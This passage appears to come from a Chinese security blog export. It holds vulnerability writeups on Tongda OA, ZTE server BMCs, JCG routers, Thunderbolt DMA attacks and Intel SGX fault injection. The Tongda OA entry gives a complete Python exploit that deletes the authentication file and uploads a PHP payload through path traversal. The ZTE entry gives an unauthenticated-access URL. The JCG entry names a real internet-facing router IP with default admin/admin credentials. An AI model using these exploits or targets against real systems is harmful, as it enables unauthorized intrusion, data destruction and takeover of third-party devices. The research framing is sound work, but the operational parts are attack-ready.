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">img</a></p>
<p>这里呢，简单来讲就是把auth.inc.php给包含进来，如果没有对应session的话，auth.inc.php就会作为“拦路虎”，让用户去登陆，但是删掉会怎么样？</p>
<p>这里就要看php里面include和require的区别了</p>
<p>这两个东西看起来很相似,都是包含嘛，但是稍稍学过洋文的都知道，include的意思指的是包含，而require却有要求的意思，在这里就可以看出点区别了。</p>
<p>如果要包含的文件找不着，include就索性跳过去了，而require是要求，感觉更加强烈一些，找不着文件就fatal error停止不前了。</p>
<p>而恰巧通达OA里面用的都是include，于是如果发现auth.inc.php失踪了，就会直接跳过去!</p>
<p>因此我们只需要利用前面的漏洞，删掉auth.inc.php，即可跳过通达OA里面大部分身份验证！</p>
<p>其中的代码验证SESSION判断是否登录</p>
<h1 id="变量覆盖和任意文件上传"><a href="#变量覆盖和任意文件上传" class="headerlink" title="变量覆盖和任意文件上传"></a>变量覆盖和任意文件上传</h1><p>这里我们看到general/data_center/utils/upload.php</p>
<p>这前面包含的header.inc.php会将$_REQUEST中的所有东西注册成变量</p>
<p>（没找到大佬说的位置）</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/getImage-20200909162931818-20200914140743298.png" alt="img"></p>
<p>可以尝试使用变量覆盖</p>
<p>漏洞点在图中最后一个else</p>
<p>$repkid可控，然后传参数时加入../../../跳到别的目录（因为通达OA的nginx配置中，上传文件所在的attachment目录里面的PHP不准访问，因此必须要跳出去）</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/getImage-20200909162931777-20200914140806788.png" alt="img"></p>
<p>POC如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">本POC不是无损利用的，会让对方系统文件被删除导致无法正常工作并且由于目标系统及网络环境不可控，该漏洞也不可能编写出在任何情况下都完全无损的EXP使用时请一定一定要慎重，一定要获取对方书面授权再使用如果仅仅想要检测漏洞的存在性，可以自己编写脚本只检测&#x2F;module&#x2F;appbuilder&#x2F;assets&#x2F;print.php是否存在 import requeststarget&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1:8203&#x2F;&quot;payload&#x3D;&quot;&lt;?php echo 123456 ?&gt;&quot;print(&quot;[*]Warning,This exploit code will DELETE auth.inc.php which may damage the OA&quot;)input(&quot;Press enter to continue&quot;)print(&quot;[*]Deleting auth.inc.php....&quot;) url&#x3D;target+&quot;&#x2F;module&#x2F;appbuilder&#x2F;assets&#x2F;print.php?guid&#x3D;..&#x2F;..&#x2F;..&#x2F;webroot&#x2F;inc&#x2F;auth.inc.php&quot;requests.get(url&#x3D;url)print(&quot;[*]Checking if file deleted...&quot;)url&#x3D;target+&quot;&#x2F;inc&#x2F;auth.inc.php&quot;page&#x3D;requests.get(url&#x3D;url).textif &#39;No input file specified.&#39; not in page:    print(&quot;[-]Failed to deleted auth.inc.php&quot;)    exit(-1)print(&quot;[+]Successfully deleted auth.inc.php!&quot;)print(&quot;[*]Uploading payload...&quot;)url&#x3D;target+&quot;&#x2F;general&#x2F;data_center&#x2F;utils&#x2F;upload.php?action&#x3D;upload&amp;filetype&#x3D;nmsl&amp;repkid&#x3D;&#x2F;.&lt;&gt;.&#x2F;.&lt;&gt;.&#x2F;.&lt;&gt;.&#x2F;&quot;files &#x3D; &#123;&#39;FILE1&#39;: (&#39;hack.php&#39;, payload)&#125;requests.post(url&#x3D;url,files&#x3D;files)url&#x3D;target+&quot;&#x2F;_hack.php&quot;page&#x3D;requests.get(url&#x3D;url).textif &#39;No input file specified.&#39; not in page:    print(&quot;[+]Filed Uploaded Successfully&quot;)    print(&quot;[+]URL:&quot;,url)else:    print(&quot;[-]Failed to upload file&quot;)</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>通达OA</tag>
      </tags>
  </entry>
  <entry>
    <title>(CVE-2020-6871)ZTE R5300G4、R8500G4和R5500G4 未授权访问漏洞</title>
    <url>/2020/09/12/IOT/Exploit/ZTE/CVE-2020-6871-ZTE-R5300G4%E3%80%81R8500G4%E5%92%8CR5500G4-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>ZTE R5300G4、R8500G4和R5500G4中的服务器管理软件模块存在安全漏洞。攻击者可利用该漏洞绕过服务器的身份验证并执行命令。</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>ZTE R5300G4 V03.08.0100版本，V03.07.0300版本，V03.07.0200版本，V03.07.0108版本，V03.07.0100版本，V03.05.0047版本，V03.05.0046版本，V03.05.0045版本，V03.05.0044版本，V03.05.0043版本，V03.05.0040版本，V03.04.0020版本；R8500G4 V03.07.0103版本，V03.07.0101版本，V03.06.0100版本，V03.05.0400版本，V03.05.0020；R5500G4 V03.08.0100版本，V03.07.0200版本，V03.07.0100版本，V03.06.0100版本。</p>
<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><blockquote>
<p>未登录状态下直接访问</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;xxx.com&#x2F;Java&#x2F;jviewer.jnlp?EXTRNIP&#x3D;设备BMC管理口ip&amp;JNLPSTR&#x3D;JViewer</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>IOT</tag>
        <tag>ZTE</tag>
      </tags>
  </entry>
  <entry>
    <title>JCG路由器命令执行漏洞</title>
    <url>/2020/09/12/IOT/Exploit/JCG/JCG%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="JCG路由器命令执行漏洞"><a href="#JCG路由器命令执行漏洞" class="headerlink" title="JCG路由器命令执行漏洞"></a>JCG路由器命令执行漏洞</h2><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>在shadan上搜索相关信息</p>
<p>JHR-N835R</p>
<p>选择其中一个进行测试</p>
<p><a href="http://216.171.4.173/home.asp">http://216.171.4.173/home.asp</a></p>
<p>默认密码：admin/admin</p>
<p>在系统工具中可执行命令</p>
]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>IOT</tag>
        <tag>JCG</tag>
      </tags>
  </entry>
  <entry>
    <title>DMA攻击和Thunderbolt 3安全级别浅谈</title>
    <url>/2020/11/28/IOT/DMA%E6%94%BB%E5%87%BB%E5%92%8CThunderbolt-3%E5%AE%89%E5%85%A8%E7%BA%A7%E5%88%AB%E6%B5%85%E8%B0%88/</url>
    <content><![CDATA[<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/DVhR_cLWsAA52bB.jpg" alt="Overview of DMA attacks"></p>
<h2 id="0x00-DMA攻击"><a href="#0x00-DMA攻击" class="headerlink" title="0x00 DMA攻击"></a>0x00 DMA攻击</h2><blockquote>
<p>​    DMA攻击是一种侧信道攻击，即攻击者可以通过利用高速扩展端口，穿透计算机和操作系统，直接读取DMA，DMA包含在许多连接中，DMA可以通过例如便携式摄像机、网卡、存储设备或者其他可直接读取或写入主内存的互动设备。此类设备的合法使用已导致DMA连接广泛，攻击者可以采用工具连接到DMA接口，绕过操作系统的安全机制和屏幕密码等，来访问部分或者全部的计算机物理内存地址，读取计算机的所有工作，窃取数据和加密密钥，安装运行间谍软件和其他漏洞利用程序，或者修改系统以允许后门或其他恶意软件</p>
</blockquote>
<p>允许DMA攻击的设备包括：FireWire、CardBus、ExpressCard、Thunderbolt、PCI和PCI Express</p>
<h2 id="0x01-DMA-是什么"><a href="#0x01-DMA-是什么" class="headerlink" title="0x01 DMA 是什么"></a>0x01 DMA 是什么</h2><blockquote>
<p>DMA(Direct Memory Access，直接存储器访问) 是所有现代电脑的重要特色，它允许不同速度的硬件装置来沟通，而不需要依赖于 CPU 的大量中断负载。否则，CPU 需要从来源把每一片段的资料复制到暂存器，然后把它们再次写回到新的地方。在这个时间中，CPU 对于其他的工作来说就无法使用。</p>
</blockquote>
<p>​    正常情况一般只有CPU才能进入主存，现在加了DMA，直接在I/O设备和主存之间打通了一个通路，用来减少CPU的负担。如果出现DMA和CPU同时访存的情况，DMA优先级更高，当两者争抢时CPU是DMA的小弟卧槽 好家伙我TM直接好家伙。</p>
<p>那么CPU和DMA同时访问主存就会出现一下三种情况：</p>
<h3 id><a href="#" class="headerlink" title></a></h3><p>​    <strong>1.CPU停止访问主存</strong></p>
<p>​            a.CPU放弃地址线的使用权<br>​            b.CPU放弃数据线的使用权<br>​            c.CPU放弃控制线的使用权</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201203193831422.png" alt="image-20201203193831422"></p>
<p>优点: 控制简单，它适用于数据传输率很高的设备进行成组传送。</p>
<p>缺点: 在DMA控制器访问内存阶段，内存的效能没有充分发挥，相当一部分内存工作周期是空闲的。这是因为，外围设备传送两个数据之间的间隔一般总是大于内存存储周期，即使高速I/O设备也是如此。例如，软盘读出一个8位二进制数大约需要32us，而半导体内存的存储周期小于0.5us，因此许多空闲的存储周期不能被CPU利用。</p>
<p>​    <strong>2.周期挪用</strong></p>
<p>​    DMA请求时，I/O设备挪用或者窃取总线占用权一个或几个主存周期</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201203193850311.png" alt="image-20201203193850311"></p>
<p>I/O设备要求DMA传送时可能遇到两种情况：</p>
<p>​            (1)此时CPU不需要访内，如CPU正在执行乘法指令。由于乘法指令执行时间较长，此时I/O访内与CPU访内没有冲突，即I/O设备挪用一二个内存周期对CPU执行程序没有任何影响。</p>
<p>​            (2)I/O设备要求访内时CPU也要求访内，这就产生了访内冲突，在这种情况下I/O设备访内优先，因为I/O访内有时间要求，前一个I/O数据必须在下一个访问请求到来之前存取完毕。显然，在这种情况下I/O 设备挪用一二个内存周期，意味着CPU延缓了对指令的执行，或者更明确地说，在CPU执行访内指令的过程中插入DMA请求，挪用了一二个内存周期。 与停止CPU访内的DMA方法比较，周期挪用的方法既实现了I/O传送，又较好地发挥了内存和CPU的效率，是一种广泛采用的方法。但是I/O设备每一次周期挪用都有申请总线控制权、建立线控制权和归还总线控制权的过程，所以传送一个字对内存来说要占用一个周期，但对DMA控制器来说一般要2—5个内存周期(视逻辑线路的延迟而定)。因此，周期挪用的方法适用于I/O设备读写周期大于内存存储周期的情况。</p>
<p>3.DMA和CPU交替访问</p>
<p>​            适用于CPU的工作周期比主存存取周期长的情况。这样可以将CPU的周期拆分成两部分，前一部分用于DMA访存，后一部分用于CPU访存</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201203194201769.png" alt="image-20201203194201769"></p>
<p>​            这种传送方式又称为“透明的DMA”方式，其来由是这种DMA传送对CPU来说，如同透明的玻璃一般，没有任何感觉或影响。在透明的DMA方式下工作，CPU既不停止主程序的运行，也不进入等待状态，是一种高效率的工作方式。当然，相应的硬件逻辑也就更加复杂。</p>
<h2 id="0x03-Thunderbolt-3-安全等级"><a href="#0x03-Thunderbolt-3-安全等级" class="headerlink" title="0x03 Thunderbolt 3 安全等级"></a>0x03 Thunderbolt 3 安全等级</h2><p><strong>无安全性（SL0）</strong></p>
<blockquote>
<p>在位于SL0模式时，任何Thunderbolt 3设备连接后将立即开始工作。此模式的危险在于，由于Thunderbolt 3支持PCIe，并且PCIe允许直接访问系统内存，因此恶意的Thunderbolt 3设备可以访问系统内存中的潜在敏感数据，而在SL0模式下，只需要简单的插入设备。</p>
</blockquote>
<p><strong>用户授权（SL1）Default</strong></p>
<blockquote>
<p>连接Thunderbolt 3设备时，用户必须响应弹出对话框以明确允许连接。用户可以选择允许一次或始终允许该特定设备。这减轻了上述SL0风险。</p>
</blockquote>
<p><strong>安全连接（SL2）</strong></p>
<blockquote>
<p>与SL1相同，不同之处在于，如果用户选择始终允许特定设备，则系统会向该设备写入加密密钥，并将其记录在其自己的固件中，以执行更强大的“身份验证”使用质询/响应机制在后续连接上对该设备的性能进行评估。这样可以防止攻击者获取已被授予“始终允许”访问权限的外围设备的设备ID并将其克隆到恶意设备上，这在SL1模式下将允许该恶意设备获得“始终允许”访问权限。但是，并非所有的Thunderbolt 3外设都支持SL2。</p>
</blockquote>
<p><strong>仅DisplayPort和USB（SL3）</strong></p>
<blockquote>
<p>通过Thunderbolt 3允许DisplayPort流量，但不允许PCIe。</p>
<p>如果设置安全模式为SL3，并且连接到实际的Thunderbolt 3扩展坞，则将获得视频输出，但将无法使用通过扩展坞的USB控制器运行的任何USB 3.x端口或其他扩展坞功能。（通常包括所有其他端口，以太网，音频等）</p>
</blockquote>
<p><strong>Daisy chaining disabled / USB docks only (SL4)</strong></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/4729ovyQtZWmVOd.png" alt="image-20200514221739727"></p>
<blockquote>
<p>SL4 会禁用thunderbolt菊花链，而不是DisplayPort菊花链。</p>
<p>在SL4模式下，允许设备使用PCIe，但仅允许链中的第一个Thunderbolt 3设备。链下游的thunderbolt设备将不允许使用PCIe。</p>
<p>此模式旨在防止恶意的Thunderbolt外围设备通过受信任的设备（例如扩展坞）来访问系统。</p>
</blockquote>
<p><strong>内核DMA保护</strong></p>
<blockquote>
<p>此模式需要系统固件，操作系统，驱动程序和Thunderbolt 3外围设备的支持。</p>
<p>内核DMA保护使系统仅允许外围设备直接访问系统内存的指定部分，从而降低了风险。</p>
<p>如果系统支持内核DMA保护，但所连接的特定Thunderbolt外围设备不支持它，则该系统将退回到该特定设备连接（通常为SL1）</p>
</blockquote>
<h2 id="0x04-攻击方式"><a href="#0x04-攻击方式" class="headerlink" title="0x04 攻击方式"></a>0x04 攻击方式</h2><ol>
<li><p>对于默认采用了SL1的设备，可以通过其主板上的SPI接口dump出Thunderbolt接口控制的固件，对固件进行修改并写回，以此将SL1降级为SL0。</p>
<p>p.s. 在对设备进行写SPI闪存进行降级的时候，可以将审批闪存设置为只读，这样用户就无法通过BIOS更改 Thunderbolt接口 的安全等级。</p>
</li>
<li><p>降级成功后通过Thunderbolt接口连接被攻击的设备，执行DMA攻击（PCILeech 攻击程序）</p>
<blockquote>
<p>PCILeech部分功能:</p>
<ul>
<li>可以通过&gt;150MB/s的速度检索内存</li>
<li>将数据写入目标内存</li>
<li>将活动的RAM挂载位文件</li>
<li>将文件系统挂载为驱动器</li>
<li>在目标系统上执行内核代码</li>
<li>解锁系统</li>
</ul>
</blockquote>
</li>
</ol>
<p>PCILeech攻击使用PCIe硬件设备读取和写入目标系统内存。这是通过在PCIe上使用DMA来实现的。目标系统上不需要驱动程序。</p>
<p>PCILeech还可以在没有硬件的情况下运行，并可以使用LeechCore库支持的多种软件内存获取方法-包括使用DumpIt或WinPmem捕获远程实时内存。PCILeech还支持本地捕获内存和多种内存转储文件格式。</p>
<p>支持多个内存采集器比如：</p>
<p>1.基于USB3380的硬件（基于USB3380的硬件只能本地读取4GB内存，但是如果首先将内核模块(KMD)插入目标系统内核，则可以读取所有内存。）<br>2.基于FPGA</p>
<p>支持的目标系统：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">UEFI</span><br><span class="line">Linux</span><br><span class="line">FreeBSD</span><br><span class="line">macOS（不支持macOS High Sierra及更高版本）</span><br><span class="line">Windows</span><br></pre></td></tr></table></figure>

<p>​    这需要有内存（USB3380硬件，FPGA硬件或CVE-2018-1038“ Total Meltdown”）的写访问权。</p>
<h2 id="0x05-安全思考"><a href="#0x05-安全思考" class="headerlink" title="0x05 安全思考"></a>0x05 安全思考</h2><p>1.设备位于SL1模式下，是否可以 窃取\克隆 已经获得授权的设备ID，以此获得无提示的设备接入。<br>2.针对上一点作出防御的SL2模式，如果在THunderbolt 3外设不支持SL2的情况下会自动降级到SL1。攻击者完全可以随心所欲降级。SL2如果不是强制实施的话等于无效</p>
<h2 id="0x08-如何缓解"><a href="#0x08-如何缓解" class="headerlink" title="0x08 如何缓解"></a>0x08 如何缓解</h2><p>BIOS中启用VT-d(IOMMU)防护DMA攻击<br><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201203195328413.png" alt="image-20201203195328413"></p>
<h2 id="0x09-参考链接"><a href="#0x09-参考链接" class="headerlink" title="0x09 参考链接"></a>0x09 参考链接</h2><p><a href="https://en.wikipedia.org/wiki/DMA_attack">https://en.wikipedia.org/wiki/DMA_attack</a><br><a href="https://baike.baidu.com/item/DMA/2385376">https://baike.baidu.com/item/DMA/2385376</a><br><a href="https://github.com/ufrisk/pcileech">https://github.com/ufrisk/pcileech</a><br><a href="https://www.anquanke.com/post/id/86840">https://www.anquanke.com/post/id/86840</a><br><a href="https://github.com/LuckyPi/PushPin">https://github.com/LuckyPi/PushPin</a><br><a href="https://www.youtube.com/watch?v=mca3rLsHuTA">https://www.youtube.com/watch?v=mca3rLsHuTA</a><br><a href="https://zhuanlan.zhihu.com/p/50640466">https://zhuanlan.zhihu.com/p/50640466</a><br><a href="https://docs.microsoft.com/zh-cn/windows/security/information-protection/kernel-dma-protection-for-thunderbolt">https://docs.microsoft.com/zh-cn/windows/security/information-protection/kernel-dma-protection-for-thunderbolt</a><br><a href="https://www.youtube.com/watch?v=7uvSZA1F9os">https://www.youtube.com/watch?v=7uvSZA1F9os</a><br><a href="https://www.youtube.com/watch?v=oEfzp4lHpB0">https://www.youtube.com/watch?v=oEfzp4lHpB0</a><br><a href="http://lordcasser.com/2020/07/01/thunderbolt/">http://lordcasser.com/2020/07/01/thunderbolt/</a></p>
]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>DMA</tag>
        <tag>Thunderbolt 3</tag>
      </tags>
  </entry>
  <entry>
    <title>SGX攻击浅谈</title>
    <url>/2020/12/01/IOT/SGX%E6%94%BB%E5%87%BB%E6%B5%85%E8%B0%88/</url>
    <content><![CDATA[<h1 id="Base-SGX-Attack"><a href="#Base-SGX-Attack" class="headerlink" title="Base-SGX-Attack"></a>Base-SGX-Attack</h1><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/Intel-SGX-enclave.jpg" alt="SgxPectre attack allows to reveal the content of the SGX enclaveSecurity  Affairs"></p>
<h2 id="0x00-起源研究"><a href="#0x00-起源研究" class="headerlink" title="0x00 起源研究"></a>0x00 起源研究</h2><h3 id="1-VOLTpwn（software-based）"><a href="#1-VOLTpwn（software-based）" class="headerlink" title="1.VOLTpwn（software-based）"></a>1.VOLTpwn（software-based）</h3><h4 id="a-介绍"><a href="#a-介绍" class="headerlink" title="a.介绍"></a>a.介绍</h4><blockquote>
<p>VOLTpwn(CVE-2019-11157)是通过Intel处理器提供的用于控制CPU电压的软件接口MSR（Model Specific Register）0x150 来实现基于电压的故障注入</p>
</blockquote>
<p>#目前为止未公布POC代码</p>
<h4 id="a-危害"><a href="#a-危害" class="headerlink" title="a.危害"></a>a.危害</h4><p>​        通过恶意软件可以使用此接口将处理器电压降低到一个临界阀值，在该阀值下某些指令将无法正常运行。这意味着攻击者能够在使用这些指令实现的计算机中实现的计算中引起位翻转。因此攻击者能够操纵密码计算，甚至偏离程序的控制流程</p>
<h4 id="b-局限性"><a href="#b-局限性" class="headerlink" title="b.局限性"></a>b.局限性</h4><p>​        由于攻击是由软件控制的，因此攻击者不需要物理访问计算机。但是，攻击者需要操作系统特权才能使用电压接口。这意味着该漏洞并不直接威胁普通用户。主要目标是受信任的执行环境，例如intel sgx</p>
<h4 id="c-如何修复"><a href="#c-如何修复" class="headerlink" title="c.如何修复"></a>c.如何修复</h4><p>​        大部分用户用不到基于软件的电压调节接口，将intel 该接口禁用即可</p>
<h3 id="2-VoltPillager（Hardware-based）"><a href="#2-VoltPillager（Hardware-based）" class="headerlink" title="2.VoltPillager（Hardware-based）"></a>2.VoltPillager（Hardware-based）</h3><h4 id="a-介绍-1"><a href="#a-介绍-1" class="headerlink" title="a.介绍"></a>a.介绍</h4><blockquote>
<p>在VOLTpwn的基础上，针对intel将基于软件的电压调节禁用以缓解故障注入对SGX的影响，提出了使用硬件手段来进行攻击。</p>
</blockquote>
<h4 id="b-影响"><a href="#b-影响" class="headerlink" title="b.影响"></a>b.影响</h4><p>​        打破了公认的“SGX可以在硬件计算服务提供商是恶意的情况下保证用户数据和计算过程的安全性”这个前提</p>
<h2 id="0x01-Intel®-SGX"><a href="#0x01-Intel®-SGX" class="headerlink" title="0x01 Intel® SGX"></a>0x01 Intel® SGX</h2><h3 id="1-概述"><a href="#1-概述" class="headerlink" title="1.概述"></a>1.概述</h3><blockquote>
<p>Intel® Software Guard Extensions (Intel® SGX)保护选定的代码和数据不被泄露和修改。开发者可以把应用程序划分到CPU强化的encalve（飞地）中或者内存中可执行的保护区域，即使在受攻击的平台中也能提高安全性。</p>
</blockquote>
<h3 id="2-特性"><a href="#2-特性" class="headerlink" title="2.特性"></a>2.特性</h3><h4 id="a-机密性和完整性"><a href="#a-机密性和完整性" class="headerlink" title="a.机密性和完整性"></a>a.机密性和完整性</h4><p>​        即使在OS、BIOS、VMM或者SMM层存在特权恶意软件的情况下也能保证。</p>
<h4 id="b-低学习曲线"><a href="#b-低学习曲线" class="headerlink" title="b.低学习曲线"></a>b.低学习曲线</h4><p>​        和父类应用程序蕾丝的OS编程模型，并且在主CPU上执行。</p>
<h4 id="c-远程认证和提供"><a href="#c-远程认证和提供" class="headerlink" title="c.远程认证和提供"></a>c.远程认证和提供</h4><p>​        远程部分能够认证一个应用程序enclave的身份，并且安全地将密钥、凭据和敏感数据提供给enclave</p>
<h4 id="d-最小可能的攻击面"><a href="#d-最小可能的攻击面" class="headerlink" title="d.最小可能的攻击面"></a>d.最小可能的攻击面</h4><p>​        CPU边界成为攻击面外围，所有数据、内存、外围之外的I/O都是加密的。</p>
<h3 id="3-解决的问题"><a href="#3-解决的问题" class="headerlink" title="3.解决的问题"></a>3.解决的问题</h3><h4 id="传统应用程序的的约束"><a href="#传统应用程序的的约束" class="headerlink" title="传统应用程序的的约束"></a>传统应用程序的的约束</h4><p>​        开发者长期以来受到主要平台提供商暴露给应用开发的安全能力的限制。黑客也一样熟悉这些功能，他们能够利用弱点来加密敏感数据、凭据或者劫持代码来进行攻击。开发者必须依赖提供商的安全架构，在平台发布之后，他们没有能力设计一个符合他们需求的安全模型。</p>
<h3 id="4-提供新的方法"><a href="#4-提供新的方法" class="headerlink" title="4.提供新的方法"></a>4.提供新的方法</h3><p>​        Intel设计了一个可能具有最小攻击面的硬件辅助的可信执行环境：CPU边界。Intel SGX提供了17种新的Intel®架构指令，应用程序可以用来为代码和数据设置保留的私有区域，也能够阻止对执行中代码和内存中数据进行的直接攻击。</p>
<h4 id="开发intel-SGX保护的应用程序"><a href="#开发intel-SGX保护的应用程序" class="headerlink" title="开发intel SGX保护的应用程序"></a>开发intel SGX保护的应用程序</h4><h5 id="a-组成"><a href="#a-组成" class="headerlink" title="a.组成"></a>a.组成</h5><ul>
<li>不可信代码</li>
<li>可信代码enclave(可以被安全调用)</li>
</ul>
<h5 id="b-运行流程"><a href="#b-运行流程" class="headerlink" title="b.运行流程"></a>b.运行流程</h5><ul>
<li>1.App由可信和不可信部分构成</li>
<li>2.App运行和穿件enclave，enclave放入可信内存中</li>
